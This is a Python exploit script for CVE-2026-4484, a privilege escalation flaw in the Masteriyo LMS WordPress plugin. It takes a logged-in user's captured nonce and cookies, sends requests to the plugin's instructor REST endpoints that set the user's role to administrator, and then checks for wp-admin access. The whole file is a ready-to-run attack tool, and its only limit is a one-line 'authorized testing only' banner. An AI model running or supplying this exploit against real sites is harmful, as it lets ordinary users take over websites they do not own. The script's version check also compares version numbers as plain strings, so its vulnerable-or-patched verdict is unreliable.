#!/usr/bin/env python3
"""
CVE-2026-4484 - Masteriyo LMS Privilege Escalation Exploit
Uses captured nonce and cookies from browser
"""

import requests
import json
import re
import sys
from bs4 import BeautifulSoup

class MasteriyoExploit:
    def __init__(self, target_url, nonce, cookie_string):
        self.target_url = target_url.rstrip('/')
        self.nonce = nonce
        self.session = requests.Session()
        
        # Parse cookies from string
        self.cookies = self.parse_cookies(cookie_string)
        
        # Set headers
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json',
            'X-WP-Nonce': self.nonce,
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': f'{self.target_url}/account/'
        }
        
    def parse_cookies(self, cookie_string):
        """Parse cookie string into dictionary"""
        cookies = {}
        for item in cookie_string.split('; '):
            if '=' in item:
                key, value = item.split('=', 1)
                cookies[key] = value
        return cookies
    
    def get_user_id(self):
        """Get current user ID from WordPress REST API"""
        print("[*] Getting user ID...")
        url = f"{self.target_url}/wp-json/wp/v2/users/me"
        
        try:
            response = self.session.get(url, headers=self.headers, cookies=self.cookies)
            
            if response.status_code == 200:
                user_data = response.json()
                user_id = user_data.get('id')
                print(f"[+] User ID found: {user_id}")
                print(f"[+] Username: {user_data.get('name')}")
                return user_id
            else:
                print(f"[-] Failed to get user ID. Status: {response.status_code}")
                return None
        except Exception as e:
            print(f"[-] Error getting user ID: {e}")
            return None
    
    def escalate_privileges(self, user_id=None):
        """Send privilege escalation request"""
        print("[*] Attempting privilege escalation...")
        
        # Try different endpoints
        endpoints = []
        
        if user_id:
            endpoints.append(f"{self.target_url}/wp-json/masteriyo/v1/users/instructors/{user_id}")
        endpoints.append(f"{self.target_url}/wp-json/masteriyo/v1/users/instructors/me")
        
        payload = {
            "roles": ["administrator"]
        }
        
        for endpoint in endpoints:
            print(f"[*] Trying endpoint: {endpoint}")
            try:
                response = self.session.post(
                    endpoint,
                    headers=self.headers,
                    cookies=self.cookies,
                    json=payload
                )
                
                print(f"[*] Response status: {response.status_code}")
                
                if response.status_code in [200, 201]:
                    try:
                        data = response.json()
                        if data.get('id') or data.get('message') == 'User updated':
                            print(f"[+] SUCCESS! Privilege escalation worked!")
                            print(f"[+] Endpoint: {endpoint}")
                            print(f"[+] Response: {json.dumps(data, indent=2)}")
                            return True
                        else:
                            print(f"[-] Response didn't indicate success: {data}")
                    except:
                        print(f"[-] Could not parse response: {response.text[:200]}")
                else:
                    print(f"[-] Endpoint returned {response.status_code}")
                    
            except Exception as e:
                print(f"[-] Error with endpoint {endpoint}: {e}")
        
        return False
    
    def verify_admin_access(self):
        """Verify admin access by checking wp-admin"""
        print("[*] Verifying admin access...")
        url = f"{self.target_url}/wp-admin/"
        
        try:
            response = self.session.get(url, headers=self.headers, cookies=self.cookies, allow_redirects=False)
            
            if response.status_code == 200:
                if "dashboard" in response.text.lower():
                    print("[+] ✅✅✅ ADMIN ACCESS CONFIRMED!")
                    print(f"[+] You can now access: {self.target_url}/wp-admin/")
                    return True
            elif response.status_code == 302:
                location = response.headers.get('Location', '')
                if 'wp-admin' in location:
                    print("[+] ✅✅✅ ADMIN ACCESS CONFIRMED! (Redirected to admin)")
                    return True
            
            print("[-] Could not confirm admin access")
            return False
            
        except Exception as e:
            print(f"[-] Verification error: {e}")
            return False
    
    def check_masteriyo_version(self):
        """Check Masteriyo plugin version"""
        print("[*] Checking Masteriyo version...")
        url = f"{self.target_url}/wp-content/plugins/learning-management-system/readme.txt"
        
        try:
            response = self.session.get(url, cookies=self.cookies)
            if response.status_code == 200:
                version_match = re.search(r'Stable tag: (\d+\.\d+\.\d+)', response.text)
                if version_match:
                    version = version_match.group(1)
                    print(f"[+] Masteriyo version: {version}")
                    
                    # Compare versions
                    from packaging import version
                    if version <= '2.1.6':
                        print("[+] ✅ Version is VULNERABLE (<= 2.1.6)")
                        return True
                    else:
                        print("[-] ❌ Version is PATCHED (> 2.1.6)")
                        return False
                else:
                    print("[-] Could not determine version from readme.txt")
            else:
                print(f"[-] Could not access readme.txt (Status: {response.status_code})")
        except Exception as e:
            print(f"[-] Error checking version: {e}")
        
        return None
    
    def run(self):
        """Main exploit flow"""
        print("=" * 60)
        print("CVE-2026-4484 - Masteriyo LMS Privilege Escalation")
        print("=" * 60)
        
        # Check version first
        vulnerable = self.check_masteriyo_version()
        
        if vulnerable is False:
            print("\n[!] Site appears patched. Exploit may not work.")
        
        # Get user ID
        user_id = self.get_user_id()
        
        if not user_id:
            print("\n[*] Attempting escalation without user ID...")
        
        # Escalate privileges
        if self.escalate_privileges(user_id):
            # Verify admin access
            self.verify_admin_access()
            
            print("\n" + "=" * 60)
            print("[+] Exploit completed!")
            print(f"[+] Try accessing: {self.target_url}/wp-admin/")
            print("=" * 60)
        else:
            print("\n[-] Exploit failed. Site may be patched or protected.")


def main():
    print("[!] For authorized security testing only\n")
    
    print("Enter the information from your browser's Network tab:")
    print("-" * 50)
    
    target = input("Target URL (e.g., https://operatordronow.pl): ").strip()
    nonce = input("X-WP-Nonce value (from request headers): ").strip()
    
    print("\nPaste the entire cookie string (from 'cookie' header):")
    print("Example: wordpress_logged_in_xxx=nagato%7C...")
    cookie_string = input("Cookie: ").strip()
    
    if not target or not nonce or not cookie_string:
        print("[-] All fields are required")
        sys.exit(1)
    
    exploit = MasteriyoExploit(target, nonce, cookie_string)
    exploit.run()


if __name__ == "__main__":
    main()
